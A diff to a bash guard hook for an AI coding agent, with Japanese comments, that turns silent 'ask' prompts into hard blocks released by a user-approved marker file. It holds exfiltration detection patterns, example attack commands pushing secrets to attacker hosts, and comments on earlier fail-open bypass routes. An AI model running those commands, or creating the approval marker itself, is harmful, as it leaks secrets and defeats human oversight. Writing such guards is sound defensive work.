@@ -10,8 +10,63 @@ if [ -z "$COMMAND" ]; then
   exit 0
 fi
 
+# --- ask 降格の実体化 ---
+# この環境は permissions.defaultMode: "auto" で、hook が permissionDecision:"ask" を
+# 返しても確認プロンプトが出ずに素通りする（実測。~/.claude/CLAUDE.md にも明記）。
+# つまり本フックの ask ゲート（exfil / パッケージ導入 / 非信頼 org への push 等）は
+# 全て no-op だった。「人間の確認を挟みたいガードは ask ではなく exit 2 + stderr」の
+# 規約に合わせ、ask を返していた箇所は block_ask() に置き換えてある。
+#
+# 通し方: ユーザーの承認を得てから `touch ~/.claude/bash-guard-ok`（10分有効・1回で消費）
+# を実行し、同じコマンドをやり直す。承認なしにこのマーカーを作らないこと。
+# guard-outbound-comms.sh の outbound-ok とは意図的に別マーカーにしている
+# （対人送信の承認が exfil ブロックまで解除してしまうのを防ぐため）。
+GUARD_HITS_LOG="${GUARD_HITS_LOG:-${HOME}/.claude/guard-hits.log}"
+BASH_GUARD_OK_MARKER="${BASH_GUARD_OK_MARKER:-${HOME}/.claude/bash-guard-ok}"
+BASH_GUARD_OK_TTL="${BASH_GUARD_OK_TTL:-600}"
+
+# ブロック理由の末尾に足す案内。Phase 3 の block_ask からも参照するため、
+# Phase 4 ではなくここで定義する（Phase 4 で定義していた頃は set -u の unbound で
+# 落ちて exit 1 = fail-open になり、認証情報+curl / tmp 経由送信が素通りしていた）。
+HINT='
+💡 恒久的に許可するには ~/.claude/hooks/allowlist.txt にパターンを追加してください。'
+
+log_hit() {
+  _detail=$(printf '%s' "${2:-}" | /usr/bin/tr '\t\n' '  ' | /usr/bin/cut -c1-200)
+  printf '%s\t%s\t%s\t%s\n' "$(date '+%Y-%m-%dT%H:%M:%S%z')" 'bash-guard' "$1" "${_detail}" \
+    >> "${GUARD_HITS_LOG}" 2>/dev/null || true
+}
+
+# 承認マーカーを消費する（mtime が TTL 内なら 0、それ以外は 1）。見つけた時点で必ず消す。
+consume_marker() {
+  [ -f "${BASH_GUARD_OK_MARKER}" ] || return 1
+  _now=$(date +%s 2>/dev/null || echo 0)
+  # GNU stat は -f を --file-system と解釈して別物を exit 0 で返すため、
+  # 数字が返ったかで判定してからもう一方へフォールバックする。
+  _mt=$(/usr/bin/stat -f %m "${BASH_GUARD_OK_MARKER}" 2>/dev/null || true)
+  case "${_mt}" in
+    ''|*[!0-9]*) _mt=$(/usr/bin/stat -c %Y "${BASH_GUARD_OK_MARKER}" 2>/dev/null || echo 0) ;;
+  esac
+  /bin/rm -f "${BASH_GUARD_OK_MARKER}" 2>/dev/null || true
+  case "${_now}${_mt}" in ''|*[!0-9]*) return 1 ;; esac
+  [ "${_now}" -ge "${_mt}" ] || return 1
+  [ $((_now - _mt)) -lt "${BASH_GUARD_OK_TTL}" ] || return 1
+  return 0
+}
+
+# $1=ログ用タグ / $2=モデルに返す理由。承認マーカーがあれば通し、無ければ exit 2 で止める。
+block_ask() {
+  if consume_marker; then
+    log_hit "$1-approved" "${COMMAND}"
+    exit 0
+  fi
+  log_hit "$1-blocked" "${COMMAND}"
+  printf '%s\n%s\n' "$2" "ユーザーの承認を得たら \`touch ~/.claude/bash-guard-ok\`（10分有効・1回で消費）を実行してから同じ操作をやり直してください。承認なしにこのマーカーを作らないこと。" >&2
+  exit 2
+}
+
 # --- Phase 1: Allowlist チェック ---
-ALLOWLIST_FILE="${HOME}/.claude/hooks/allowlist.txt"
+ALLOWLIST_FILE="${BASH_GUARD_ALLOWLIST:-${HOME}/.claude/hooks/allowlist.txt}"
 if [ -f "$ALLOWLIST_FILE" ]; then
   while IFS= read -r pattern; do
     [[ -z "$pattern" || "$pattern" =~ ^[[:space:]]*# ]] && continue
@@ -83,8 +138,7 @@ if echo "$COMMAND" | grep -qiE "$EGRESS_RE" || echo "$COMMAND" | grep -qiE "$WRA
     else
       GUARD_TRIG="WebFetch/WebSearch 直後(90秒以内)"
     fi
-    echo "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"ask\",\"permissionDecisionReason\":\"🌐 外部接触ガード: ${GUARD_TRIG} の状態で外部送信・外部コード取得コマンド(curl/wget/nc/npx 等)を検出。任意ホストへのデータ送信・未検査コードの実行になり得ます。許可しますか？\\n今後も許可する場合は ~/.claude/hooks/allowlist.txt にパターンを追加してください。\"}}"
-    exit 0
+    block_ask "extfetch-egress" "🌐 外部接触ガード: ${GUARD_TRIG} の状態で外部送信・外部コード取得コマンド(curl/wget/nc/npx 等)を検出。任意ホストへのデータ送信・未検査コードの実行になり得ます。恒久的に許可するなら ~/.claude/hooks/allowlist.txt にパターンを追加してください。"
   fi
 fi
 
@@ -242,7 +296,7 @@ PYEOF
 # HAS_GH_GIST=1 のときは Phase 1.5 の信頼 org allow を適用しない（gist は org に紐付かず、
 # cwd フォールバックで信頼 repo 内からの gist 作成 = exfil が素通りしてしまうため）。
 if [ "$PRIMARY_CMD" = "gh" ] && [ "$HAS_GH_GIST" -eq 0 ]; then
-  TRUSTED_ORGS_FILE="${HOME}/.claude/hooks/gh-trusted-orgs.txt"
+  TRUSTED_ORGS_FILE="${BASH_GUARD_TRUSTED_ORGS:-${HOME}/.claude/hooks/gh-trusted-orgs.txt}"
   if [ -f "$TRUSTED_ORGS_FILE" ]; then
     TARGET_ORG=""
     # 1. 明示的な repo フラグ (--repo / -R; 区切りは空白 or =、-R は連結形も可) から OWNER を抽出
@@ -295,22 +349,45 @@ fi
 # 確認に回せる。push の対象 remote を「URL 直指定なら URL から」「remote 名なら
 # git -C <repo> remote get-url で」解決して owner を判定する。cd ラッパー時は cd 先を
 # repo dir として使い、解決できない場合は安全側に ask。
-if [ "$PRIMARY_CMD" = "git" ]; then
-  GIT_TRUSTED_FILE="${HOME}/.claude/hooks/gh-trusted-orgs.txt"
-  GIT_OP=""
-  if echo "$EFFECTIVE_COMMAND" | grep -qE '(^|[[:space:]])push([[:space:]]|$)'; then
-    GIT_OP="push"
-  elif echo "$EFFECTIVE_COMMAND" | grep -qE '(^|[[:space:]])remote[[:space:]]+(add|set-url)([[:space:]]|$)'; then
-    GIT_OP="remote-write"
-  fi
+# 判定は PRIMARY_CMD ではなくコマンド境界で行う。先頭コマンドが git のときだけ見ていた
+# 頃は `ls; git push https://attacker/x.git` が丸ごと素通りしていた（gh api 側は同じ理由で
+# 既に境界判定に直してある）。
+GIT_OP=""
+# push / remote-write の判定は「コマンド境界の直後に現れる git のサブコマンド位置」に
+# 限定する。単に文字列として push を含むかで見ていた頃は
+# `git log ...; echo "未 push のコミット"` のような引用符の中の語まで push 扱いになった
+# （ask が素通りしていた間は無害だったが、exit 2 の実ブロックになって表面化した）。
+# `git -C <dir> push` / `git --no-pager push` のようにグローバルフラグ（値付きを含む）が
+# 挟まる形は読み飛ばす。`ls; git push <url>` のような複合コマンドは境界 (^|[|;&(`]) で拾う。
+# 境界にサブシェル/コマンド置換の開き括弧とバッククォートも含める（`$(git push <url>)` や
+# `(cd x && git push <url>)` は実行されるのに、`[|;&]` だけでは境界に当たらず素通りしていた）。
+GIT_SUB_PREFIX='(^|[|;&(`])[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*git([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+'
+# クォートの中身は「実行されないテキスト」なので判定対象から外す（guard-bash-command.sh の
+# cmd_stripped と同じ手）。外さないと `git commit -m "…; git push …"` や、このガード自身の
+# 説明を書く編集コマンドのように、文字列の中に区切り + git push を含むだけで実ブロックになる。
+# ただし eval / xargs / sh -c 系はクォートの中身がそのまま実行されるため、その場合は
+# 生のまま判定して回避経路にしない。
+if echo "$EFFECTIVE_COMMAND" | grep -qE '(^|[|;&[:space:]])(eval|xargs|(ba|z|da|k)?sh[[:space:]]+-[A-Za-z]*c)([[:space:]]|$)'; then
+  # eval / sh -c 系: クォートの中身は実行されるので消さず、クォート文字だけを区切りに変える
+  # （`sh -c 'git push …'` のように、区切り文字が引用符しかない形を拾うため）。
+  GIT_SCAN=$(printf '%s' "$EFFECTIVE_COMMAND" | /usr/bin/perl -0777 -pe 's/["\x27]/;/gs' 2>/dev/null || printf '%s' "$EFFECTIVE_COMMAND")
+else
+  GIT_SCAN=$(printf '%s' "$EFFECTIVE_COMMAND" | /usr/bin/perl -0777 -pe 's/"[^"]*"//gs; s/\x27[^\x27]*\x27//gs' 2>/dev/null || printf '%s' "$EFFECTIVE_COMMAND")
+fi
+if echo "$GIT_SCAN" | grep -qE "${GIT_SUB_PREFIX}push([[:space:]]|$)"; then
+  GIT_OP="push"
+elif echo "$GIT_SCAN" | grep -qE "${GIT_SUB_PREFIX}remote[[:space:]]+(add|set-url)([[:space:]]|$)"; then
+  GIT_OP="remote-write"
+fi
+if [ -n "$GIT_OP" ]; then
+  GIT_TRUSTED_FILE="${BASH_GUARD_TRUSTED_ORGS:-${HOME}/.claude/hooks/gh-trusted-orgs.txt}"
   # 信頼 org リストが無い場合は fail-closed: push / remote 書込を ask に降格する。
   # ここで素通りさせると Phase 2 の git safe-command allow に落ちて
   # `git push https://attacker/x.git` が無確認で通る（exfil ゲートが fail-open）。
-  if [ -n "$GIT_OP" ] && [ ! -f "$GIT_TRUSTED_FILE" ]; then
-    echo "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"ask\",\"permissionDecisionReason\":\"🔐 git ${GIT_OP}: 信頼 org リスト(~/.claude/hooks/gh-trusted-orgs.txt)が未作成のため push 先を判定できません。任意リモートへの push は exfil 経路になり得ます。許可しますか？\\n⚠️ CC の『今後確認しない』は押さないこと（git push では全 org 無確認になりゲートが無効化）。信頼 org を ~/.claude/hooks/gh-trusted-orgs.txt に追記すれば以後この org への push は無確認になります。\"}}"
-    exit 0
+  if [ ! -f "$GIT_TRUSTED_FILE" ]; then
+    block_ask "git-trusted-list-missing" "🔐 git ${GIT_OP}: 信頼 org リスト(~/.claude/hooks/gh-trusted-orgs.txt)が未作成のため push 先を判定できません。任意リモートへの push は exfil 経路になり得ます。信頼 org を同ファイルに追記すれば以後その org への push は無確認になります。"
   fi
-  if [ -n "$GIT_OP" ] && [ -f "$GIT_TRUSTED_FILE" ]; then
+  if [ -f "$GIT_TRUSTED_FILE" ]; then
     # push の remote 引数 / remote-write の URL 引数、および先頭 cd 先を抽出する。
     # 出力は 2 行: 1 行目 = target(remote 名 or URL)、2 行目 = cd 先(無ければ空)。
     GIT_PARSED=$(python3 - "$COMMAND" "$GIT_OP" <<'GITEOF' 2>/dev/null
@@ -327,30 +404,43 @@ for i, x in enumerate(t):
         cd_dir = t[i + 1]; break
     if x not in ("(", "{"):
         break
-# git の位置
-gi = None
-for i, x in enumerate(t):
-    if x == "git":
-        gi = i; break
-if gi is None:
-    print(""); print(cd_dir); print(""); sys.exit(0)
-rest = t[gi + 1:]
 # git のグローバルフラグを読み飛ばす。-C <dir> は push 先 repo を変えるため必ず捕捉する
 # （取り違えると非信頼 remote を信頼 repo の origin で誤判定してしまう）。
-git_c = ""
-i = 0
-while i < len(rest):
-    x = rest[i]
-    if x == "-C" and i + 1 < len(rest):
-        git_c = rest[i + 1]; i += 2; continue
-    if x.startswith("-C") and len(x) > 2:
-        git_c = x[2:]; i += 1; continue
-    if x in ("-c", "--git-dir", "--work-tree", "--namespace", "--exec-path"):
-        i += 2; continue
-    if x.startswith("-"):
-        i += 1; continue
-    break
-sub = rest[i:]
+def split_git(rest):
+    git_c = ""
+    i = 0
+    while i < len(rest):
+        x = rest[i]
+        if x == "-C" and i + 1 < len(rest):
+            git_c = rest[i + 1]; i += 2; continue
+        if x.startswith("-C") and len(x) > 2:
+            git_c = x[2:]; i += 1; continue
+        if x in ("-c", "--git-dir", "--work-tree", "--namespace", "--exec-path"):
+            i += 2; continue
+        if x.startswith("-"):
+            i += 1; continue
+        break
+    return git_c, rest[i:]
+def is_op(sub):
+    if not sub:
+        return False
+    if op == "push":
+        return sub[0] == "push"
+    return sub[0] == "remote" and len(sub) > 1 and sub[1] in ("add", "set-url")
+# git の位置。`git add -A && git commit -m x && git push` のような連鎖では先頭の git が
+# push とは限らないので、GIT_OP に対応するサブコマンドを持つ git 出現を選ぶ。
+# 先頭の git だけ見ていた頃は sub[0] が "add" になり target が空 → owner 解決不可 →
+# 信頼 org への push まで一律ブロックしていた（ask が素通りしていた間は無害だった）。
+gis = [i for i, x in enumerate(t) if x == "git"]
+if not gis:
+    print(""); print(cd_dir); print(""); sys.exit(0)
+git_c, sub = "", []
+for gi in gis:
+    git_c, sub = split_git(t[gi + 1:])
+    if is_op(sub):
+        break
+else:
+    git_c, sub = split_git(t[gis[0] + 1:])
 target = ""
 # シェルのリダイレクト/パイプ等を target 探索から除外する。これが無いと
 # `git push 2>&1` / `git push > log 2>&1` / `git push 2>&1 | tail` で
@@ -460,8 +550,8 @@ GITEOF
           _hint="このorgを今後信頼するなら次を実行（プロンプトに ! 始まりで貼れます）: echo '${GIT_OWNER}' >> ~/.claude/hooks/gh-trusted-orgs.txt"
           ;;
       esac
-      echo "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"ask\",\"permissionDecisionReason\":\"🔐 git ${GIT_OP}: 信頼 org 外 (${_disp})。任意リモートへの push は exfil 経路になり得ます。許可しますか？\\n⚠️ ここで CC の『今後確認しない』は押さないこと（git push では全 org 無確認になりゲートが無効化）。\\n${_hint}\"}}"
-      exit 0
+      block_ask "git-untrusted-org" "🔐 git ${GIT_OP}: 信頼 org 外 (${_disp})。任意リモートへの push は exfil 経路になり得ます。
+${_hint}"
     fi
   fi
 fi
@@ -557,30 +647,29 @@ fi
 # ネットワーク + 認証情報パターン → ユーザーに確認
 CRED='(\.env|token\.json|client_secret|api_key|credential|\.pem|\.key)'
 if echo "$COMMAND" | grep -qiE "$CRED"; then
-  echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"⚠️ ネットワーク送信と認証情報アクセスの組み合わせを検出。\n今後も許可する場合は ~/.claude/hooks/allowlist.txt にパターンを追加してください。"}}'
-  exit 0
+  block_ask "net-credential" "⚠️ ネットワーク送信と認証情報アクセス(.env / token.json / *.pem 等)の組み合わせを検出。認証情報の外部送信になり得ます。${HINT}"
 fi
 
 # base64 + ネットワーク → ユーザーに確認
 if echo "$COMMAND" | grep -qiE 'base64' && echo "$COMMAND" | grep -qiE '(curl|wget|http)'; then
-  echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"⚠️ base64エンコードとネットワーク送信の組み合わせを検出。\n今後も許可する場合は ~/.claude/hooks/allowlist.txt にパターンを追加してください。"}}'
-  exit 0
+  block_ask "net-base64" "⚠️ base64 エンコードとネットワーク送信の組み合わせを検出。エンコードした機密の持ち出し経路になり得ます。${HINT}"
 fi
 
 # /tmp 経由の間接送信 → ユーザーに確認
-if echo "$COMMAND" | grep -qiE '/tmp/' && echo "$COMMAND" | grep -qiE '(curl|wget)'; then
-  echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"⚠️ 一時ファイル経由のネットワーク送信パターンを検出。\n今後も許可する場合は ~/.claude/hooks/allowlist.txt にパターンを追加してください。"}}'
-  exit 0
+# Claude Code のセッション scratchpad（/private/tmp/claude-<uid>/... ）はパスに /tmp/ を
+# 含むため、成果物をそこへ落とすだけの `curl -o <scratchpad>/x` まで巻き込む。
+# 判定前に scratchpad のパスだけ落とし、それ以外の一時ファイル経由だけを見る。
+COMMAND_NOSCRATCH=$(printf '%s' "$COMMAND" | sed -E 's#(/private)?/tmp/claude-[0-9]+/[^[:space:]]*##g')
+if echo "$COMMAND_NOSCRATCH" | grep -qiE '/tmp/' && echo "$COMMAND" | grep -qiE '(curl|wget)'; then
+  block_ask "net-tmpfile" "⚠️ 一時ファイル経由のネットワーク送信パターンを検出。${HINT}"
 fi
 
 # --- Phase 4: Ask guard（確認付き許可） ---
-HINT='\n💡 今後も許可するには ~/.claude/hooks/allowlist.txt にパターンを追加してください。'
 
 # パッケージインストール系（到達判定と同一の HAS_PKG_INSTALL を使う = single source of truth。
 # 到達フラグと ask 条件を別々の正規表現にすると「到達はするが ask しない」ドリフトが再発するため一本化）
 if [ "$HAS_PKG_INSTALL" -eq 1 ]; then
-  echo "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"ask\",\"permissionDecisionReason\":\"📦 パッケージのインストールを実行しようとしています。許可しますか？${HINT}\"}}"
-  exit 0
+  block_ask "pkg-install" "📦 パッケージのインストールを実行しようとしています。Web が示した名前をそのまま入れないこと（typosquatting）。${HINT}"
 fi
 
 # GitHub CLI の変更系操作（gist / issue create / release create）
@@ -588,8 +677,7 @@ fi
 # `gh -R owner/repo issue create`（gh はグローバルフラグを subcommand の前に許容）を
 # 取りこぼす。HAS_GH_SUB_WRITE 側でフラグ read-skip 済みなので flag に一本化する。
 if [ "$HAS_GH_SUB_WRITE" -eq 1 ]; then
-  echo "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"ask\",\"permissionDecisionReason\":\"🔗 GitHub CLI で外部操作を実行しようとしています。許可しますか？${HINT}\"}}"
-  exit 0
+  block_ask "gh-shared-write" "🔗 GitHub CLI の共有状態を変える操作(gist / issue create / release create)です。gist は org に紐付かない公開 paste なので常にここで止まります。${HINT}"
 fi
 
 # gh api の変更系 (-X POST/PUT/PATCH/DELETE / --method)
@@ -597,26 +685,22 @@ fi
 # 攻撃シナリオ: `gh api -X POST repos/attacker/repo/issues -f body=@SECRETFILE` のように
 # `*.github.com` への書き込み経路で機密を流出させる pattern を防ぐ。
 if [ "$HAS_GH_API_WRITE" -eq 1 ]; then
-  echo "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"ask\",\"permissionDecisionReason\":\"🔗 gh api: 信頼 org 外への変更系操作 (-X POST/PUT/PATCH/DELETE)。許可しますか？信頼 org に追加する場合は ~/.claude/hooks/gh-trusted-orgs.txt に owner を追記してください。${HINT}\"}}"
-  exit 0
+  block_ask "gh-api-write" "🔗 gh api: 信頼 org 外への変更系操作 (-X POST/PUT/PATCH/DELETE)。信頼 org に追加する場合は ~/.claude/hooks/gh-trusted-orgs.txt に owner を追記してください。${HINT}"
 fi
 
 # curl/wget によるデータ送信（GET は対象外、POST/PUT 系のみ）
 if echo "$COMMAND" | grep -qiE '(curl\s+.*(-d\s|--data|--data-binary|--data-raw|-F\s)|wget\s+(--post-file|--post-data))'; then
-  echo "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"ask\",\"permissionDecisionReason\":\"🌐 curl/wget でデータ送信を実行しようとしています。許可しますか？${HINT}\"}}"
-  exit 0
+  block_ask "curl-post" "🌐 curl/wget でのデータ送信(-d / --data / -F / --post-file)を検出。任意ホストへの持ち出し経路になり得ます。${HINT}"
 fi
 
 # パイプ → curl/wget
 if echo "$COMMAND" | grep -qiE '\|\s*(curl|wget)\s'; then
-  echo "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"ask\",\"permissionDecisionReason\":\"🌐 パイプ経由で curl/wget にデータを送信しようとしています。許可しますか？${HINT}\"}}"
-  exit 0
+  block_ask "pipe-to-curl" "🌐 パイプ経由で curl/wget にデータを送信しようとしています。${HINT}"
 fi
 
 # python http.server（到達判定と同一の HAS_PY_HTTPSERVER を使う）
 if [ "$HAS_PY_HTTPSERVER" -eq 1 ]; then
-  echo "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"ask\",\"permissionDecisionReason\":\"🌐 ローカル HTTP サーバーを起動しようとしています。許可しますか？${HINT}\"}}"
-  exit 0
+  block_ask "local-httpserver" "🌐 ローカル HTTP サーバーを起動しようとしています。${HINT}"
 fi
 
 exit 0
